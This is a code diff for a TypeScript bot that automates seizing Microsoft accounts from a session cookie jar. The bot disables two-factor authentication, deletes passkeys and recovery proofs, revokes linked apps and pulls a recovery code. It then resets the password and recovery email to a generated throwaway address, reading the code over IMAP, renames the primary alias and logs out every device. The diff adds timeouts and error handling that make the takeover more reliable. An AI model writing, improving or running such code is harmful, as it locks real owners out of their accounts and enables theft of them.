@@ -553,64 +553,111 @@ async function removeZyger(jar: CookieJar, apiCanary: string) {
 
 async function removeProofs(jar: CookieJar, apiCanary: string) {
   try {
-    const res = await fetchWithJar(jar, "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security", {
-      redirect: "manual",
-    });
+    const res = await fetchWithJar(
+      jar,
+      "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
+      { redirect: "manual" },
+      { timeoutMs: 20_000 },
+    );
     const text = await res.text();
-    const proofIds = extractAll(text, /"proofId":"([^"]+)"/);
+    const proofIds = extractAll(text, /"proofId":"([^"]+)"/).slice(0, 8);
 
     for (const rawId of proofIds) {
       const proofId = decodeUnicode(rawId);
       try {
-        await fetchWithJar(jar, "https://account.live.com/API/Proofs/DeleteProof", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            Accept: "application/json",
-            canary: apiCanary,
+        await fetchWithJar(
+          jar,
+          "https://account.live.com/API/Proofs/DeleteProof",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+              "X-Requested-With": "XMLHttpRequest",
+              Accept: "application/json",
+              canary: apiCanary,
+            },
+            body: JSON.stringify({
+              proofId,
+              uaid: "114b68368b7b46afa44c82a8246e4a44",
+              uiflvr: 1001,
+              scid: 100109,
+              hpgid: 201030,
+            }),
           },
-          body: JSON.stringify({
-            proofId,
-            uaid: "114b68368b7b46afa44c82a8246e4a44",
-            uiflvr: 1001,
-            scid: 100109,
-            hpgid: 201030,
-          }),
-        });
-      } catch {}
+          { timeoutMs: 15_000 },
+        );
+      } catch {
+        /* skip one proof */
+      }
     }
-  } catch {}
+  } catch {
+    /* ignore */
+  }
 }
 
 async function removeServices(jar: CookieJar) {
   try {
-    const res = await fetchWithJar(jar, "https://account.live.com/consent/Manage?guat=1", {
-      headers: { Referer: "https://login.live.com/" },
-    });
+    const res = await fetchWithJar(
+      jar,
+      "https://account.live.com/consent/Manage?guat=1",
+      { headers: { Referer: "https://login.live.com/" } },
+      { timeoutMs: 20_000 },
+    );
     const text = await res.text();
-    const clientIds = extractAll(text, /client_id=([A-F0-9]{16})/);
+    // Cap — this step often hangs when many apps are linked
+    const clientIds = extractAll(text, /client_id=([A-F0-9]{16})/).slice(0, 4);
 
     if (!clientIds.length) return;
 
     for (const clientId of clientIds) {
       try {
-        const editRes = await fetchWithJar(jar, `https://account.live.com/consent/Edit?client_id=${clientId}`, {
-          redirect: "manual",
-        });
+        const editRes = await fetchWithJar(
+          jar,
+          `https://account.live.com/consent/Edit?client_id=${clientId}`,
+          { redirect: "manual" },
+          { timeoutMs: 15_000 },
+        );
         const editText = await editRes.text();
-        const postUrl = extract(editText, /name="editConsentForm"[^>]*action="([^"]+)"/);
-        const canary = encodeURIComponent(extract(editText, /canary"[^>]*value="([^"]+)"/));
+        const postUrl = editText.match(/name="editConsentForm"[^>]*action="([^"]+)"/)?.[1];
+        const canaryRaw = editText.match(/canary"[^>]*value="([^"]+)"/)?.[1];
+        if (!postUrl || !canaryRaw) continue;
+        const canary = encodeURIComponent(canaryRaw);
 
-        await fetchWithJar(jar, postUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: new URLSearchParams({ canary }).toString(),
-          redirect: "manual",
-        });
-      } catch {}
+        await fetchWithJar(
+          jar,
+          postUrl,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({ canary }).toString(),
+            redirect: "manual",
+          },
+          { timeoutMs: 15_000 },
+        );
+      } catch {
+        /* skip one app */
+      }
     }
-  } catch {}
+  } catch {
+    /* ignore */
+  }
+}
+
+/** Hard timeout wrapper so one MS step can't freeze the whole job */
+function withTimeout<T>(p: Promise<T>, ms: number, label: string): Promise<T> {
+  return new Promise((resolve, reject) => {
+    const t = setTimeout(() => reject(new Error(`${label} timed out after ${ms}ms`)), ms);
+    p.then(
+      (v) => {
+        clearTimeout(t);
+        resolve(v);
+      },
+      (e) => {
+        clearTimeout(t);
+        reject(e);
+      },
+    );
+  });
 }
 
 async function securityInformation(jar: CookieJar): Promise<string> {
@@ -685,20 +732,19 @@ async function getEmailCode(
     const lock = await client.getMailboxLock("INBOX");
     try {
       const startTime = Date.now();
-      const timeout = 90_000;
+      const timeout = 45_000;
 
       while (Date.now() - startTime < timeout) {
         if (signal?.aborted) throw new Error("Aborted while waiting for security code");
         const mb = client.mailbox;
         const latestSeq = mb && typeof mb === "object" ? mb.exists : 0;
         if (latestSeq > 0) {
-          const message = await client.fetchOne(
-            `${latestSeq}`,
-            { source: true },
-          );
+          const message = await client.fetchOne(`${latestSeq}`, { source: true });
           if (message) {
             const source = message.source?.toString() || "";
-            const match = source.match(/Security code:\s*(\d+)/);
+            const match =
+              source.match(/Security code:\s*(\d+)/i) ||
+              source.match(/\b(\d{6})\b/);
             if (match) {
               return match[1];
             }
@@ -706,7 +752,7 @@ async function getEmailCode(
         }
         await new Promise((r) => setTimeout(r, 2000));
       }
-      throw new Error("Timeout waiting for security code");
+      throw new Error("Timeout waiting for security code (Firstmail IMAP)");
     } finally {
       lock.release();
     }
@@ -1114,19 +1160,20 @@ export async function runSecureBot(
     if (apiCanary) {
       try {
         await log("info", "[secure] Disabling 2FA...");
-        await remove2FA(jar, apiCanary);
+        await withTimeout(remove2FA(jar, apiCanary), 20_000, "remove2FA");
       } catch (e) {
         await log("warn", `[secure] remove2FA: ${e instanceof Error ? e.message : e}`);
       }
       try {
         await log("info", "[secure] Removing passkeys...");
-        await removeZyger(jar, apiCanary);
+        await withTimeout(removeZyger(jar, apiCanary), 20_000, "removeZyger");
       } catch (e) {
         await log("warn", `[secure] removeZyger: ${e instanceof Error ? e.message : e}`);
       }
       try {
         await log("info", "[secure] Removing security proofs...");
-        await removeProofs(jar, apiCanary);
+        await withTimeout(removeProofs(jar, apiCanary), 45_000, "removeProofs");
+        await log("info", "[secure] Security proofs step done");
       } catch (e) {
         await log("warn", `[secure] removeProofs: ${e instanceof Error ? e.message : e}`);
       }
@@ -1135,8 +1182,9 @@ export async function runSecureBot(
     }
 
     try {
-      await log("info", "[secure] Removing third-party services...");
-      await removeServices(jar);
+      await log("info", "[secure] Removing third-party services (max 4)...");
+      await withTimeout(removeServices(jar), 40_000, "removeServices");
+      await log("info", "[secure] Services step done");
     } catch (e) {
       await log("warn", `[secure] removeServices: ${e instanceof Error ? e.message : e}`);
     }
@@ -1147,10 +1195,13 @@ export async function runSecureBot(
     await log("info", "[secure] Getting security information...");
     let secInfoJson: Record<string, unknown> | null = null;
     try {
-      const secInfoStr = await securityInformation(jar);
+      const secInfoStr = await withTimeout(securityInformation(jar), 25_000, "securityInformation");
       secInfoJson = JSON.parse(secInfoStr) as Record<string, unknown>;
-    } catch {
-      await log("error", "[secure] Failed to get security info");
+    } catch (e) {
+      await log(
+        "error",
+        `[secure] Failed to get security info: ${e instanceof Error ? e.message : e}`,
+      );
     }
 
     if (secInfoJson) {
@@ -1160,58 +1211,100 @@ export async function runSecureBot(
         (secInfoJson.WLXAccount as Record<string, unknown>)?.manageProofs as Record<string, string>
       )?.encryptedNetId;
 
-      if (mainEmail && encryptedNetId) {
-        await log("info", "[secure] Getting recovery code...");
-        const recoveryCode = await getRecoveryCode(jar, apiCanary, encryptedNetId);
-        await log("info", `[secure] Got recovery code`);
+      if (mainEmail && encryptedNetId && apiCanary) {
+        try {
+          await log("info", "[secure] Getting recovery code...");
+          const recoveryCode = await withTimeout(
+            getRecoveryCode(jar, apiCanary, encryptedNetId),
+            25_000,
+            "getRecoveryCode",
+          );
+          await log("info", `[secure] Got recovery code`);
 
-        ensureAlive();
-        await log("info", "[secure] Generating new email...");
-        const newEmailData = await generateEmail();
-        await log("info", `[secure] Generated email: ${newEmailData.email}`);
-
-        const newPassword = Math.random().toString(36).slice(2, 14);
-
-        await log("info", "[secure] Running recovery flow...");
-        const recoveryResult = await recover(
-          jar,
-          mainEmail,
-          recoveryCode,
-          newEmailData.email,
-          newPassword,
-          newEmailData.token,
-          runSignal,
-        );
-
-        if (recoveryResult) {
-          result.newEmail = newEmailData.email;
-          result.newPassword = newPassword;
-          result.recoveryCode = recoveryResult.recoveryCode;
-          await log("info", "[secure] Account secured successfully!");
-
-          // Change primary alias to a new outlook.com address
           ensureAlive();
-          await log("info", "[secure] Changing primary alias...");
-          const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
-          const aliasChanged = await changePrimaryAlias(jar, aliasName, apiCanary);
-          if (aliasChanged) {
-            result.newEmail = `${aliasName}@outlook.com`;
-            await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
+          if (!process.env.FIRSTMAIL_API_KEY) {
+            await log("error", "[secure] FIRSTMAIL_API_KEY missing on worker — cannot finish recovery");
           } else {
-            await log(
-              "warn",
-              "[secure] Failed to change primary alias - email recovery address preserved",
+            await log("info", "[secure] Generating new email...");
+            const newEmailData = await withTimeout(generateEmail(), 20_000, "generateEmail");
+            await log("info", `[secure] Generated email: ${newEmailData.email}`);
+
+            const newPassword = Math.random().toString(36).slice(2, 14);
+
+            await log("info", "[secure] Running recovery flow (may wait for Firstmail OTP)...");
+            const recoveryResult = await withTimeout(
+              recover(
+                jar,
+                mainEmail,
+                recoveryCode,
+                newEmailData.email,
+                newPassword,
+                newEmailData.token,
+                runSignal,
+              ),
+              120_000,
+              "recover",
             );
+
+            if (recoveryResult) {
+              result.newEmail = newEmailData.email;
+              result.newPassword = newPassword;
+              result.recoveryCode = recoveryResult.recoveryCode;
+              await log("info", "[secure] Account secured successfully!");
+
+              ensureAlive();
+              await log("info", "[secure] Changing primary alias...");
+              try {
+                const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
+                const aliasChanged = await withTimeout(
+                  changePrimaryAlias(jar, aliasName, apiCanary),
+                  30_000,
+                  "changePrimaryAlias",
+                );
+                if (aliasChanged) {
+                  result.newEmail = `${aliasName}@outlook.com`;
+                  await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
+                } else {
+                  await log(
+                    "warn",
+                    "[secure] Failed to change primary alias - email recovery address preserved",
+                  );
+                }
+              } catch (e) {
+                await log(
+                  "warn",
+                  `[secure] alias change skipped: ${e instanceof Error ? e.message : e}`,
+                );
+              }
+            } else {
+              await log("error", "[secure] Recovery flow returned null");
+            }
           }
+        } catch (e) {
+          await log(
+            "error",
+            `[secure] Recovery block failed: ${e instanceof Error ? e.message : e}`,
+          );
         }
+      } else {
+        await log(
+          "error",
+          `[secure] Missing mainEmail/encryptedNetId/apiCanary for recovery (email=${!!mainEmail} netId=${!!encryptedNetId} canary=${!!apiCanary})`,
+        );
       }
     }
 
     ensureAlive();
 
     // Logout all
-    await log("info", "[secure] Logging out all devices...");
-    await logoutAll(jar, apiCanary);
+    try {
+      await log("info", "[secure] Logging out all devices...");
+      if (apiCanary) {
+        await withTimeout(logoutAll(jar, apiCanary), 20_000, "logoutAll");
+      }
+    } catch (e) {
+      await log("warn", `[secure] logoutAll: ${e instanceof Error ? e.message : e}`);
+    }
 
     const secured =
       result.newEmail !== "Couldn't Change!" &&
